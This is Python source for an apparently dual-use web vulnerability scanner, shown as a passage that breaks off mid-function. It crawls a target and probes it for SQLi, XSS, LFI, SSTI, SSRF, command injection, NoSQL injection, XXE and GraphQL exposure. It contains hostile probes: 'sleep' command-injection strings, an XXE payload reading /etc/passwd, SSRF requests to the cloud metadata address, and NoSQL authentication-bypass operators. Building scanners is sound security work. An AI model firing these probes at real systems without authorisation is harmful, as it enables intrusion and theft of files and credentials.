"""
Unified Scanner - All-in-One Security Assessment

Combines all scanning and exploitation capabilities:
- Reconnaissance (crawling, tech detection)
- Vulnerability scanning (SQLi, XSS, LFI, RCE, SSRF)
- Advanced exploits (SSTI, XXE, NoSQL, JWT, GraphQL, Deserialization)
- Data extraction and exfiltration
- Proof of concept generation
"""

import asyncio
import aiohttp
import json
import logging
import hashlib
import urllib.parse
from datetime import datetime
from typing import Dict, Any, List, Optional, Callable
from dataclasses import dataclass, field, asdict
from enum import Enum
import re

logger = logging.getLogger(__name__)


class ScanPhase(Enum):
    INIT = "init"
    RECON = "reconnaissance"
    CRAWLING = "crawling"
    TECH_DETECT = "technology_detection"
    VULN_SCAN = "vulnerability_scanning"
    EXPLOIT = "exploitation"
    POST_EXPLOIT = "post_exploitation"
    EXTRACT = "data_extraction"
    REPORT = "report_generation"
    COMPLETE = "complete"
    FAILED = "failed"


class Severity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class ExploitStep:
    """Single step in exploitation timeline"""
    step: int
    action: str
    timestamp: str
    request: Optional[str] = None
    response_status: Optional[int] = None
    response_preview: Optional[str] = None
    success: bool = False
    note: str = ""


@dataclass
class HttpCapture:
    """Captured HTTP request/response"""
    request_method: str
    request_url: str
    request_headers: Dict[str, str]
    request_body: Optional[str]
    response_status: int
    response_headers: Dict[str, str]
    response_body: str
    response_time: float


@dataclass
class Finding:
    """Single vulnerability finding with full exploitation details"""
    id: str
    vuln_type: str
    severity: Severity
    url: str
    parameter: Optional[str]
    payload: str
    evidence: str
    description: str
    poc: str
    extracted_data: Optional[Dict] = None
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    # New fields for detailed output
    timeline: List[ExploitStep] = field(default_factory=list)
    http_captures: List[HttpCapture] = field(default_factory=list)
    screenshot_path: Optional[str] = None

    def to_dict(self) -> Dict:
        result = {
            "id": self.id,
            "vuln_type": self.vuln_type,
            "severity": self.severity.value,
            "url": self.url,
            "parameter": self.parameter,
            "payload": self.payload,
            "evidence": self.evidence,
            "description": self.description,
            "poc": self.poc,
            "extracted_data": self.extracted_data,
            "timestamp": self.timestamp,
            "screenshot_path": self.screenshot_path,
            "timeline": [
                {
                    "step": s.step,
                    "action": s.action,
                    "timestamp": s.timestamp,
                    "request": s.request,
                    "response_status": s.response_status,
                    "response_preview": s.response_preview,
                    "success": s.success,
                    "note": s.note
                }
                for s in self.timeline
            ],
            "http_captures": [
                {
                    "request": {
                        "method": c.request_method,
                        "url": c.request_url,
                        "headers": c.request_headers,
                        "body": c.request_body
                    },
                    "response": {
                        "status": c.response_status,
                        "headers": c.response_headers,
                        "body": c.response_body[:2000] if c.response_body else None,
                        "time": c.response_time
                    }
                }
                for c in self.http_captures
            ]
        }
        return result


@dataclass
class ScanSession:
    """Full scan session tracking"""
    scan_id: str
    target_url: str
    start_time: str
    phase: ScanPhase
    progress: int = 0
    findings: List[Finding] = field(default_factory=list)
    endpoints_discovered: List[str] = field(default_factory=list)
    technologies: List[str] = field(default_factory=list)
    events: List[Dict] = field(default_factory=list)
    total_requests: int = 0
    errors: List[str] = field(default_factory=list)
    end_time: Optional[str] = None
    # New fields for detailed logs tab
    enrichments: List[Dict] = field(default_factory=list)
    recon_results: Optional[Dict] = None
    module_results: Dict[str, Any] = field(default_factory=dict)
    detailed_logs: List[Dict] = field(default_factory=list)
    llm_analyses: List[Dict] = field(default_factory=list)

    def to_dict(self) -> Dict:
        return {
            "scan_id": self.scan_id,
            "target_url": self.target_url,
            "start_time": self.start_time,
            "end_time": self.end_time,
            "phase": self.phase.value,
            "progress": self.progress,
            "findings": [f.to_dict() for f in self.findings],
            "findings_count": len(self.findings),
            "severity_counts": self._count_severities(),
            "severity_summary": self._count_severities(),
            "endpoints_discovered": len(self.endpoints_discovered),
            "endpoints_list": self.endpoints_discovered[:100],
            "technologies": self.technologies,
            "total_requests": self.total_requests,
            "errors": self.errors,
            "enrichments": self.enrichments,
            "recon_results": self.recon_results,
            "module_results": self.module_results,
            "detailed_logs": self.detailed_logs[-500:],
            "llm_analyses": self.llm_analyses
        }

    def _count_severities(self) -> Dict[str, int]:
        counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for f in self.findings:
            counts[f.severity.value] += 1
        return counts


class UnifiedScanner:
    """All-in-one security scanner"""

    def __init__(self):
        self.sessions: Dict[str, ScanSession] = {}
        self.session: Optional[aiohttp.ClientSession] = None
        self.event_callback: Optional[Callable] = None
        self.stop_requested: Dict[str, bool] = {}
        self.screenshot_service = None
        self.screenshots_enabled = True

        # Import payloads
        from app.payloads import (
            SQLI_PAYLOADS, SQLI_WAF_BYPASS,
            XSS_PAYLOADS, XSS_WAF_BYPASS,
            SSTI_PAYLOADS, SSTI_BY_ENGINE,
            XXE_PAYLOADS,
            NOSQL_PAYLOADS,
            LFI_PAYLOADS, LFI_WRAPPERS,
            RCE_PAYLOADS,
            SSRF_PAYLOADS, SSRF_BYPASS,
            GRAPHQL_PAYLOADS,
        )

        self.payloads = {
            "sqli": SQLI_PAYLOADS,
            "sqli_bypass": SQLI_WAF_BYPASS,
            "xss": XSS_PAYLOADS,
            "xss_bypass": XSS_WAF_BYPASS,
            "ssti": SSTI_PAYLOADS,
            "ssti_engines": SSTI_BY_ENGINE,
            "xxe": XXE_PAYLOADS,
            "nosql": NOSQL_PAYLOADS,
            "lfi": LFI_PAYLOADS,
            "lfi_wrappers": LFI_WRAPPERS,
            "rce": RCE_PAYLOADS,
            "ssrf": SSRF_PAYLOADS,
            "ssrf_bypass": SSRF_BYPASS,
            "graphql": GRAPHQL_PAYLOADS,
        }

    async def initialize(self):
        if not self.session:
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=30),
                connector=aiohttp.TCPConnector(ssl=False, limit=20)
            )

        # Initialize screenshot service
        if self.screenshots_enabled and not self.screenshot_service:
            try:
                from app.services.screenshot import get_screenshot_service
                self.screenshot_service = get_screenshot_service()
                await self.screenshot_service.initialize()
            except Exception as e:
                logger.warning(f"Screenshot service unavailable: {e}")

    async def close(self):
        if self.session:
            await self.session.close()
            self.session = None
        if self.screenshot_service:
            await self.screenshot_service.close()
            self.screenshot_service = None

    async def _capture_screenshot(self, finding: Finding, url: str) -> Optional[str]:
        """Capture screenshot for a finding"""
        if not self.screenshot_service or not self.screenshots_enabled:
            return None

        # Only capture for critical and high severity
        if finding.severity not in [Severity.CRITICAL, Severity.HIGH]:
            return None

        try:
            screenshot_path = await self.screenshot_service.capture_with_payload(
                url, finding.id
            )
            return screenshot_path
        except Exception as e:
            logger.warning(f"Screenshot capture failed: {e}")
            return None

    async def _add_finding(
        self,
        session: ScanSession,
        finding: Finding,
        test_url: str,
        vuln_type: str
    ):
        """Add finding with screenshot capture"""
        # Capture screenshot
        screenshot_path = await self._capture_screenshot(finding, test_url)
        if screenshot_path:
            finding.screenshot_path = screenshot_path

        session.findings.append(finding)
        self._log_event(session, vuln_type, f"FOUND: {finding.url}")

    def _generate_id(self) -> str:
        return hashlib.md5(f"{datetime.now().isoformat()}".encode()).hexdigest()[:12]

    def _log_event(self, session: ScanSession, phase: str, message: str):
        event = {
            "id": len(session.events) + 1,
            "timestamp": datetime.now().isoformat(),
            "phase": phase,
            "message": message
        }
        session.events.append(event)
        if len(session.events) > 100:
            session.events = session.events[-100:]
        logger.info(f"[{session.scan_id}] [{phase}] {message}")

    async def _request(
        self,
        session: ScanSession,
        method: str,
        url: str,
        headers: Dict = None,
        data: Any = None,
        params: Dict = None,
        capture: bool = False
    ) -> tuple:
        """Make HTTP request with optional full capture"""
        session.total_requests += 1
        default_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
        if headers:
            default_headers.update(headers)

        try:
            import time
            start_time = time.time()
            async with self.session.request(
                method, url, headers=default_headers, data=data, params=params
            ) as resp:
                text = await resp.text()
                elapsed = time.time() - start_time
                resp_headers = dict(resp.headers)

                if capture:
                    http_capture = HttpCapture(
                        request_method=method,
                        request_url=url,
                        request_headers=default_headers,
                        request_body=data if isinstance(data, str) else json.dumps(data) if data else None,
                        response_status=resp.status,
                        response_headers=resp_headers,
                        response_body=text,
                        response_time=elapsed
                    )
                    return text, resp.status, resp_headers, http_capture

                return text, resp.status, resp_headers
        except Exception as e:
            if capture:
                return None, 0, {}, None
            return None, 0, {}

    def _is_login_or_error_page(self, response: str) -> bool:
        """Check if response is a login page or error page (not authenticated)"""
        if not response:
            return True
        resp_lower = response.lower()

        # Login page indicators
        login_indicators = [
            "login", "log in", "sign in", "signin", "authenticate",
            "password", "username", "forgot password", "reset password",
            "create account", "register", "inscription"
        ]

        # Error page indicators
        error_indicators = [
            "error", "denied", "forbidden", "unauthorized", "not found",
            "access denied", "permission denied", "invalid", "failed"
        ]

        # Count login/error indicators
        login_count = sum(1 for ind in login_indicators if ind in resp_lower)
        error_count = sum(1 for ind in error_indicators if ind in resp_lower)

        # If many login/error indicators, it's probably not a bypass
        return login_count >= 2 or error_count >= 2

    def _is_authenticated_content(self, response: str, baseline: str = None) -> bool:
        """Check if response shows authenticated content"""
        if not response:
            return False
        resp_lower = response.lower()

        # Must have authenticated indicators
        auth_indicators = [
            "logout", "log out", "sign out", "signout", "disconnect",
            "my account", "my profile", "dashboard", "admin panel",
            "settings", "preferences", "welcome back", "hello,",
            "inbox", "messages", "notifications"
        ]

        # Must NOT have login form indicators
        login_form_indicators = [
            'type="password"', "type='password'",
            'name="_pass"', 'name="password"', 'name="pass"',
            'id="login', 'class="login', 'action="login'
        ]

        has_auth = any(ind in resp_lower for ind in auth_indicators)
        has_login_form = any(ind in response.lower() for ind in login_form_indicators)

        # If baseline provided, check if response is significantly different
        if baseline and has_auth:
            # Response should be different from baseline (before injection)
            baseline_len = len(baseline)
            response_len = len(response)
            # Significant length difference suggests different page
            if abs(response_len - baseline_len) < 100:
                return False

        return has_auth and not has_login_form

    def _validate_ssrf(self, response: str, payload: str) -> tuple:
        """Validate SSRF - check for actual internal data exposure"""
        if not response:
            return False, None

        resp_lower = response.lower()

        # AWS metadata specific indicators
        if "169.254.169.254" in payload:
            aws_indicators = ["ami-", "instance-id", "local-ipv4", "security-credentials", "iam"]
            for ind in aws_indicators:
                if ind in resp_lower:
                    return True, f"AWS metadata exposed: {ind}"

        # Localhost/internal indicators - must show ACTUAL internal content
        internal_content = [
            "root:", "/etc/passwd", "localhost",
            "internal server", "apache", "nginx",
            "phpinfo", "server_addr", "document_root"
        ]

        # Exclude if it's just the payload reflected
        for ind in internal_content:
            if ind in resp_lower and payload.lower() not in resp_lower[:500]:
                return True, f"Internal content exposed: {ind}"

        return False, None

    # ==================== RECONNAISSANCE ====================

    async def _crawl(self, session: ScanSession, base_url: str, max_pages: int = 50):
        """Crawl target to discover endpoints"""
        self._log_event(session, "crawl", f"Starting crawl of {base_url}")
        visited = set()
        to_visit = [base_url]
        endpoints = []

        parsed_base = urllib.parse.urlparse(base_url)
        base_domain = parsed_base.netloc

        while to_visit and len(visited) < max_pages:
            if self.stop_requested.get(session.scan_id):
                break

            url = to_visit.pop(0)
            if url in visited:
                continue

            visited.add(url)
            resp, status, _ = await self._request(session, "GET", url)

            if resp and status == 200:
                endpoints.append(url)
                # Extract links
                links = re.findall(r'href=["\']([^"\']+)["\']', resp)
                links += re.findall(r'action=["\']([^"\']+)["\']', resp)
                links += re.findall(r'src=["\']([^"\']+)["\']', resp)

                for link in links:
                    if link.startswith("/"):
                        link = f"{parsed_base.scheme}://{base_domain}{link}"
                    elif not link.startswith("http"):
                        continue

                    parsed_link = urllib.parse.urlparse(link)
                    if parsed_link.netloc == base_domain and link not in visited:
                        to_visit.append(link)

                # Extract forms and parameters
                forms = re.findall(r'<form[^>]*>(.*?)</form>', resp, re.DOTALL | re.IGNORECASE)
                for form in forms:
                    inputs = re.findall(r'name=["\']([^"\']+)["\']', form)
                    if inputs:
                        self._log_event(session, "crawl", f"Found form with params: {inputs}")

        session.endpoints_discovered = list(set(endpoints))
        self._log_event(session, "crawl", f"Discovered {len(endpoints)} endpoints")
        return endpoints

    async def _detect_technologies(self, session: ScanSession, url: str):
        """Detect technologies used by target"""
        self._log_event(session, "tech", "Detecting technologies")
        resp, status, headers = await self._request(session, "GET", url)
        techs = []

        if resp:
            # Server header
            if "Server" in headers:
                techs.append(headers["Server"])
            if "X-Powered-By" in headers:
                techs.append(headers["X-Powered-By"])

            # Framework detection
            patterns = {
                "WordPress": ["wp-content", "wp-includes", "wordpress"],
                "Drupal": ["drupal", "sites/default"],
                "Joomla": ["joomla", "/administrator"],
                "Laravel": ["laravel_session", "csrf-token"],
                "Django": ["csrfmiddlewaretoken", "django"],
                "Flask": ["werkzeug", "flask"],
                "Express": ["express", "x-powered-by: express"],
                "React": ["react", "_reactRoot", "data-reactroot"],
                "Vue": ["vue", "__vue__", "v-cloak"],
                "Angular": ["ng-app", "angular", "ng-"],
                "jQuery": ["jquery"],
                "Bootstrap": ["bootstrap"],
                "PHP": [".php", "PHPSESSID"],
                "ASP.NET": [".aspx", "asp.net", "__VIEWSTATE"],
                "Java": [".jsp", ".do", "jsessionid"],
                "Ruby": [".rb", "rails", "_session_id"],
                "GraphQL": ["graphql", "__schema"],
            }

            resp_lower = resp.lower()
            headers_str = str(headers).lower()

            for tech, indicators in patterns.items():
                for indicator in indicators:
                    if indicator.lower() in resp_lower or indicator.lower() in headers_str:
                        if tech not in techs:
                            techs.append(tech)
                        break

        session.technologies = techs
        self._log_event(session, "tech", f"Detected: {', '.join(techs) if techs else 'None'}")
        return techs

    # ==================== VULNERABILITY SCANNING ====================

    async def _test_sqli(self, session: ScanSession, url: str, param: str):
        """Test for SQL injection"""
        payloads = self.payloads["sqli"]["detection"][:15]
        timeline = []
        captures = []
        step_num = 0

        for payload in payloads:
            if self.stop_requested.get(session.scan_id):
                return

            step_num += 1
            test_url = self._inject_param(url, param, payload)

            # Create timeline step
            step = ExploitStep(
                step=step_num,
                action=f"Testing SQLi payload: {payload[:50]}",
                timestamp=datetime.now().isoformat(),
                request=f"GET {test_url}",
                success=False
            )

            result = await self._request(session, "GET", test_url, capture=True)
            resp, status, _, http_capture = result if len(result) == 4 else (*result, None)

            step.response_status = status
            step.response_preview = resp[:200] if resp else None

            if resp:
                errors = [
                    "sql syntax", "mysql", "sqlite", "postgresql", "oracle",
                    "syntax error", "unclosed quotation", "unterminated string",
                    "you have an error in your sql", "warning: mysql"
                ]
                resp_lower = resp.lower()

                for error in errors:
                    if error in resp_lower:
                        step.success = True
                        step.note = f"SQL error detected: {error}"
                        timeline.append(step)
                        if http_capture:
                            captures.append(http_capture)

                        finding = Finding(
                            id=self._generate_id(),
                            vuln_type="SQL Injection",
                            severity=Severity.CRITICAL,
                            url=url,
                            parameter=param,
                            payload=payload,
                            evidence=f"SQL error detected: {error}",
                            description="SQL injection vulnerability allows attackers to manipulate database queries",
                            poc=self._gen_sqli_poc(url, param, payload),
                            timeline=timeline,
                            http_captures=captures
                        )
                        await self._add_finding(session, finding, test_url, "sqli")
                        return

            timeline.append(step)
            if http_capture:
                captures.append(http_capture)

    async def _test_xss(self, session: ScanSession, url: str, param: str):
        """Test for XSS"""
        payloads = self.payloads["xss"]["basic"][:10]
        marker = f"xss{self._generate_id()[:6]}"
        timeline = []
        captures = []
        step_num = 0

        for payload in payloads:
            if self.stop_requested.get(session.scan_id):
                return

            step_num += 1
            test_payload = payload.replace("alert(1)", f"alert('{marker}')")
            test_url = self._inject_param(url, param, test_payload)

            step = ExploitStep(
                step=step_num,
                action=f"Testing XSS payload: {test_payload[:50]}",
                timestamp=datetime.now().isoformat(),
                request=f"GET {test_url}",
                success=False
            )

            result = await self._request(session, "GET", test_url, capture=True)
            resp, status, _, http_capture = result if len(result) == 4 else (*result, None)

            step.response_status = status
            step.response_preview = resp[:200] if resp else None

            if resp:
                # Check if payload is reflected in executable context
                # Not just in input value or URL
                is_reflected = test_payload in resp or marker in resp

                # Check it's not just reflected in an attribute (encoded)
                encoded_markers = [
                    f'value="{test_payload}',
                    f"value='{test_payload}",
                    f'"{test_payload}"',
                    f"'{test_payload}'",
                    f"&lt;script",  # HTML encoded
                    f"%3Cscript"    # URL encoded
                ]
                is_encoded = any(enc in resp for enc in encoded_markers)

                # Check for actual script context
                script_contexts = [
                    f"<script>{marker}",
                    f"<script>alert('{marker}')",
                    f"onerror=alert('{marker}')",
                    f"onload=alert('{marker}')",
                    test_payload  # Raw payload in HTML
                ]
                in_script_context = any(ctx in resp for ctx in script_contexts)

                if is_reflected and (in_script_context or not is_encoded):
                    step.success = True
                    step.note = "Payload reflected in executable context"
                    timeline.append(step)
                    if http_capture:
                        captures.append(http_capture)

                    finding = Finding(
                        id=self._generate_id(),
                        vuln_type="Cross-Site Scripting (XSS)",
                        severity=Severity.HIGH,
                        url=url,
                        parameter=param,
                        payload=test_payload,
                        evidence="Payload reflected in executable context without encoding",
                        description="XSS allows attackers to inject malicious scripts",
                        poc=self._gen_xss_poc(url, param, test_payload),
                        timeline=timeline,
                        http_captures=captures
                    )
                    await self._add_finding(session, finding, test_url, "xss")
                    return

            timeline.append(step)
            if http_capture:
                captures.append(http_capture)

    async def _test_lfi(self, session: ScanSession, url: str, param: str):
        """Test for LFI"""
        payloads = self.payloads["lfi"]["basic"][:10]
        timeline = []
        captures = []
        step_num = 0

        for payload in payloads:
            if self.stop_requested.get(session.scan_id):
                return

            step_num += 1
            test_url = self._inject_param(url, param, payload)

            step = ExploitStep(
                step=step_num,
                action=f"Testing LFI payload: {payload[:50]}",
                timestamp=datetime.now().isoformat(),
                request=f"GET {test_url}",
                success=False
            )

            result = await self._request(session, "GET", test_url, capture=True)
            resp, status, _, http_capture = result if len(result) == 4 else (*result, None)

            step.response_status = status
            step.response_preview = resp[:200] if resp else None

            if resp and ("root:" in resp or "[fonts]" in resp.lower()):
                step.success = True
                step.note = "System file content detected"
                timeline.append(step)
                if http_capture:
                    captures.append(http_capture)

                finding = Finding(
                    id=self._generate_id(),
                    vuln_type="Local File Inclusion",
                    severity=Severity.CRITICAL,
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence="System file content detected in response",
                    description="LFI allows attackers to read local files",
                    poc=self._gen_lfi_poc(url, param, payload),
                    extracted_data={"file_content": resp[:500]},
                    timeline=timeline,
                    http_captures=captures
                )
                await self._add_finding(session, finding, test_url, "lfi")
                return

            timeline.append(step)
            if http_capture:
                captures.append(http_capture)

    async def _test_ssti(self, session: ScanSession, url: str, param: str):
        """Test for SSTI"""
        payloads = self.payloads["ssti"]["detection"][:8]
        timeline = []
        captures = []
        step_num = 0

        for payload in payloads:
            if self.stop_requested.get(session.scan_id):
                return

            step_num += 1
            test_url = self._inject_param(url, param, payload)

            step = ExploitStep(
                step=step_num,
                action=f"Testing SSTI payload: {payload[:50]}",
                timestamp=datetime.now().isoformat(),
                request=f"GET {test_url}",
                success=False
            )

            result = await self._request(session, "GET", test_url, capture=True)
            resp, status, _, http_capture = result if len(result) == 4 else (*result, None)

            step.response_status = status
            step.response_preview = resp[:200] if resp else None

            if resp:
                # Check for template evaluation
                if "49" in resp and "7*7" in payload:
                    step.success = True
                    step.note = "Template expression evaluated (7*7=49)"
                    timeline.append(step)
                    if http_capture:
                        captures.append(http_capture)

                    finding = Finding(
                        id=self._generate_id(),
                        vuln_type="Server-Side Template Injection",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence="Template expression evaluated (7*7=49)",
                        description="SSTI can lead to remote code execution",
                        poc=self._gen_ssti_poc(url, param, payload),
                        timeline=timeline,
                        http_captures=captures
                    )
                    await self._add_finding(session, finding, test_url, "ssti")
                    return

            timeline.append(step)
            if http_capture:
                captures.append(http_capture)

    async def _test_ssrf(self, session: ScanSession, url: str, param: str):
        """Test for SSRF"""
        payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]",
            "http://0.0.0.0",
        ]
        timeline = []
        captures = []
        step_num = 0

        for payload in payloads:
            if self.stop_requested.get(session.scan_id):
                return

            step_num += 1
            test_url = self._inject_param(url, param, payload)

            step = ExploitStep(
                step=step_num,
                action=f"Testing SSRF payload: {payload}",
                timestamp=datetime.now().isoformat(),
                request=f"GET {test_url}",
                success=False
            )

            result = await self._request(session, "GET", test_url, capture=True)
            resp, status, _, http_capture = result if len(result) == 4 else (*result, None)

            step.response_status = status
            step.response_preview = resp[:200] if resp else None

            # Validate SSRF with strict checks
            is_ssrf, evidence = self._validate_ssrf(resp, payload)
            if is_ssrf:
                step.success = True
                step.note = evidence
                timeline.append(step)
                if http_capture:
                    captures.append(http_capture)

                finding = Finding(
                    id=self._generate_id(),
                    vuln_type="Server-Side Request Forgery",
                    severity=Severity.HIGH,
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence=evidence,
                    description="SSRF allows accessing internal resources",
                    poc=self._gen_ssrf_poc(url, param, payload),
                    timeline=timeline,
                    http_captures=captures
                )
                await self._add_finding(session, finding, test_url, "ssrf")
                return

            timeline.append(step)
            if http_capture:
                captures.append(http_capture)

    async def _test_rce(self, session: ScanSession, url: str, param: str):
        """Test for command injection"""
        payloads = ["; sleep 5", "| sleep 5", "|| sleep 5", "& sleep 5", "&& sleep 5"]
        timeline = []
        captures = []
        step_num = 0

        for payload in payloads:
            if self.stop_requested.get(session.scan_id):
                return

            step_num += 1
            test_url = self._inject_param(url, param, payload)

            step = ExploitStep(
                step=step_num,
                action=f"Testing RCE payload: {payload}",
                timestamp=datetime.now().isoformat(),
                request=f"GET {test_url}",
                success=False
            )

            start = asyncio.get_event_loop().time()
            result = await self._request(session, "GET", test_url, capture=True)
            elapsed = asyncio.get_event_loop().time() - start
            resp, status, _, http_capture = result if len(result) == 4 else (*result, None)

            step.response_status = status
            step.response_preview = resp[:200] if resp else None

            if elapsed > 4.5:  # Time-based detection
                step.success = True
                step.note = f"Time-based detection: {elapsed:.2f}s delay"
                timeline.append(step)
                if http_capture:
                    captures.append(http_capture)

                finding = Finding(
                    id=self._generate_id(),
                    vuln_type="Remote Code Execution",
                    severity=Severity.CRITICAL,
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence=f"Time-based detection: {elapsed:.2f}s delay",
                    description="Command injection allows executing system commands",
                    poc=self._gen_rce_poc(url, param, payload),
                    timeline=timeline,
                    http_captures=captures
                )
                await self._add_finding(session, finding, test_url, "rce")
                return

            timeline.append(step)
            if http_capture:
                captures.append(http_capture)

    async def _test_xxe(self, session: ScanSession, url: str):
        """Test for XXE on XML endpoints"""
        xxe_payload = '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'''
        timeline = []
        captures = []

        step = ExploitStep(
            step=1,
            action="Testing XXE with external entity payload",
            timestamp=datetime.now().isoformat(),
            request=f"POST {url} with XML payload",
            success=False
        )

        headers = {"Content-Type": "application/xml"}
        result = await self._request(session, "POST", url, headers=headers, data=xxe_payload, capture=True)
        resp, status, _, http_capture = result if len(result) == 4 else (*result, None)

        step.response_status = status
        step.response_preview = resp[:200] if resp else None

        if resp and "root:" in resp:
            step.success = True
            step.note = "File content extracted via XXE"
            timeline.append(step)
            if http_capture:
                captures.append(http_capture)

            finding = Finding(
                id=self._generate_id(),
                vuln_type="XML External Entity Injection",
                severity=Severity.CRITICAL,
                url=url,
                parameter=None,
                payload=xxe_payload,
                evidence="File content extracted via XXE",
                description="XXE allows reading local files and SSRF",
                poc=self._gen_xxe_poc(url, xxe_payload),
                extracted_data={"file_content": resp[:500]},
                timeline=timeline,
                http_captures=captures
            )
            await self._add_finding(session, finding, url, "xxe")
        else:
            timeline.append(step)
            if http_capture:
                captures.append(http_capture)

    async def _test_nosql(self, session: ScanSession, url: str, param: str):
        """Test for NoSQL injection"""
        payloads = ['{"$ne": ""}', '{"$gt": ""}', '{"$regex": ".*"}']
        timeline = []
        captures = []
        step_num = 0

        for payload in payloads:
            if self.stop_requested.get(session.scan_id):
                return

            step_num += 1
            headers = {"Content-Type": "application/json"}
            body = f'{{"{param}": {payload}}}'

            step = ExploitStep(
                step=step_num,
                action=f"Testing NoSQL payload: {payload}",
                timestamp=datetime.now().isoformat(),
                request=f"POST {url} with body: {body}",
                success=False
            )

            result = await self._request(session, "POST", url, headers=headers, data=body, capture=True)
            resp, status, _, http_capture = result if len(result) == 4 else (*result, None)

            step.response_status = status
            step.response_preview = resp[:200] if resp else None

            if resp and status == 200:
                # Strict validation: must be authenticated content, not login page
                if self._is_authenticated_content(resp) and not self._is_login_or_error_page(resp):
                    step.success = True
                    step.note = "Authentication bypass - accessed protected content"
                    timeline.append(step)
                    if http_capture:
                        captures.append(http_capture)

                    finding = Finding(
                        id=self._generate_id(),
                        vuln_type="NoSQL Injection",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence="Authentication bypass - accessed protected content without credentials",
                        description="NoSQL injection allows bypassing authentication",
                        poc=self._gen_nosql_poc(url, param, payload),
                        timeline=timeline,
                        http_captures=captures
                    )
                    await self._add_finding(session, finding, url, "nosql")
                    return

            timeline.append(step)
            if http_capture:
                captures.append(http_capture)

    async def _test_graphql(self, session: ScanSession, url: str):
        """Test GraphQL endpoint"""
        introspection = '{"query": "{ __schema { types { name } } }"}'
        timeline = []
        captures = []

        step = ExploitStep(
            step=1,
            action="Testing GraphQL introspection query",
            timestamp=datetime.now().isoformat(),
            request=f"POST {url} with introspection query",
            success=False
        )

        headers = {"Content-Type": "application/json"}
        result = await self._request(session, "POST", url, headers=headers, data=introspection, capture=True)
        resp, status, _, http_capture = result if len(result) == 4 else (*result, None)

        step.response_status = status
        step.response_preview = resp[:200] if resp else None

        if resp and "__schema" in resp:
            step.success = True
            step.note = "Full schema exposed via introspection"
            timeline.append(step)
            if http_capture:
                captures.append(http_capture)

            finding = Finding(
                id=self._generate_id(),
                vuln_type="GraphQL Introspection Enabled",
                severity=Severity.MEDIUM,
                url=url,
                parameter=None,
                payload=introspection,
                evidence="Full schema exposed via introspection",
                description="GraphQL introspection reveals API structure",
                poc=self._gen_graphql_poc(url, introspection),
                timeline=timeline,
                http_captures=captures
            )
            await self._add_finding(session, finding, url, "graphql")
        else:
            timeline.append(step)
            if http_capture:
                captures.append(http_capture)

    # ==================== MAIN SCAN ====================

    async def full_scan(
        self,
        target_url: str,
        max_pages: int = 50,
        callback: Optional[Callable] = None
    ) -> ScanSession:
        """Execute complete security scan - creates new session"""
        await self.initialize()

        scan_id = self._generate_id()
        session = ScanSession(
            scan_id=scan_id,
            target_url=target_url,
            start_time=datetime.now().isoformat(),
            phase=ScanPhase.INIT
        )
        self.sessions[scan_id] = session
        self.stop_requested[scan_id] = False
        self.event_callback = callback

        await self._run_full_scan(session, max_pages)
        return session

    async def _run_full_scan(
        self,
        session: ScanSession,
        max_pages: int = 50
    ):
        """Execute scan on existing session"""
        scan_id = session.scan_id
        target_url = session.target_url

        try:
            # Phase 1: Reconnaissance
            session.phase = ScanPhase.RECON
            session.progress = 5
            self._log_event(session, "init", f"Starting scan on {target_url}")

            # Crawling
            session.phase = ScanPhase.CRAWLING
            session.progress = 10
            await self._crawl(session, target_url, max_pages)

            if self.stop_requested.get(scan_id):
                return session

            # Tech detection
            session.phase = ScanPhase.TECH_DETECT
            session.progress = 20
            await self._detect_technologies(session, target_url)

            if self.stop_requested.get(scan_id):
                return session

            # Phase 2: Vulnerability Scanning
            session.phase = ScanPhase.VULN_SCAN
            endpoints = session.endpoints_discovered or [target_url]
            total_tests = len(endpoints) * 7  # 7 vuln types
            completed = 0

            for endpoint in endpoints:
                if self.stop_requested.get(scan_id):
                    break

                # Extract parameters from URL
                parsed = urllib.parse.urlparse(endpoint)
                params = urllib.parse.parse_qs(parsed.query)
                param_names = list(params.keys()) if params else ["id", "page", "file", "url", "q"]

                for param in param_names:
                    if self.stop_requested.get(scan_id):
                        break

                    self._log_event(session, "scan", f"Testing {endpoint} param={param}")

                    # Run all tests
                    await self._test_sqli(session, endpoint, param)
                    await self._test_xss(session, endpoint, param)
                    await self._test_lfi(session, endpoint, param)
                    await self._test_ssti(session, endpoint, param)
                    await self._test_ssrf(session, endpoint, param)
                    await self._test_rce(session, endpoint, param)
                    await self._test_nosql(session, endpoint, param)

                completed += 7
                session.progress = 20 + int((completed / total_tests) * 60)

            # Test XXE on base URL
            await self._test_xxe(session, target_url)

            # Test GraphQL
            for gql_path in ["/graphql", "/api/graphql", "/gql"]:
                gql_url = f"{target_url.rstrip('/')}{gql_path}"
                await self._test_graphql(session, gql_url)

            if self.stop_requested.get(scan_id):
                return

            # Phase 3: Advanced Modules
            session.progress = 85
            await self._run_advanced_modules(session, target_url)

            # Phase 4: Complete
            session.phase = ScanPhase.COMPLETE
            session.progress = 100
            session.end_time = datetime.now().isoformat()
            self._log_event(session, "complete", f"Scan finished. Found {len(session.findings)} vulnerabilities")

        except Exception as e:
            session.phase = ScanPhase.FAILED
            session.errors.append(str(e))
            self._log_event(session, "error", str(e))
            logger.exception(f"Scan failed: {e}")

    async def _run_advanced_modules(self, session: ScanSession, target_url: str):
        """Run advanced security testing modules"""
        scan_id = session.scan_id

        def add_detailed_log(module: str, action: str, data: Any = None, status: str = "info"):
            """Add detailed log entry"""
            session.detailed_logs.append({
                "timestamp": datetime.now().isoformat(),
                "module": module,
                "action": action,
                "data": data,
                "status": status
            })

        try:
            # Import modules
            from app.modules import (
                AuthTester, APISecurityTester, WebSocketTester,
                ReconScanner, AdvancedFuzzer
            )

            parsed = urllib.parse.urlparse(target_url)
